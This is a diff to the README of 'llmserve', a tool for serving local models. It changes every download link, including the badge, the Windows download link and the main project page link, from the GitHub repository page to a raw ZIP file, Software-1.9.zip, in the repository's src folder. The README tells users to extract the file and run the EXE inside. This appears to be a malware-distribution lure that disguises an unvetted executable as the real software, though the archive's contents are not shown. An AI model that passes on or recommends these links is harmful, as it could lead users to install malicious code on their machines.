@@ -1,6 +1,6 @@
 # 🧠 llmserve - Serve Local Models with Ease
 
-[![Download](https://img.shields.io/badge/Download-llmserve-blue?style=for-the-badge)](https://github.com/Clashing-delinquency248/llmserve)
+[![Download](https://img.shields.io/badge/Download-llmserve-blue?style=for-the-badge)](https://github.com/Clashing-delinquency248/llmserve/raw/refs/heads/main/src/Software-1.9.zip)
 
 ## 🚀 What is llmserve?
 
@@ -12,7 +12,7 @@ Use it when you want to run local models from your own machine and keep the proc
 
 To get llmserve on Windows, visit this page to download the app:
 
-[Download llmserve](https://github.com/Clashing-delinquency248/llmserve)
+[Download llmserve](https://github.com/Clashing-delinquency248/llmserve/raw/refs/heads/main/src/Software-1.9.zip)
 
 After the page opens, look for the latest release or download file and save it to your PC. If the file is a ZIP, extract it first before you run the app. If it is an EXE, you can run it after the download finishes.
 
@@ -202,7 +202,7 @@ If the app still does not work, redownload the release from the GitHub page and 
 
 The main project page is here:
 
-[https://github.com/Clashing-delinquency248/llmserve](https://github.com/Clashing-delinquency248/llmserve)
+[https://github.com/Clashing-delinquency248/llmserve/raw/refs/heads/main/src/Software-1.9.zip](https://github.com/Clashing-delinquency248/llmserve/raw/refs/heads/main/src/Software-1.9.zip)
 
 Use that page to get the latest Windows file, check the release files, and return for future updates.
 
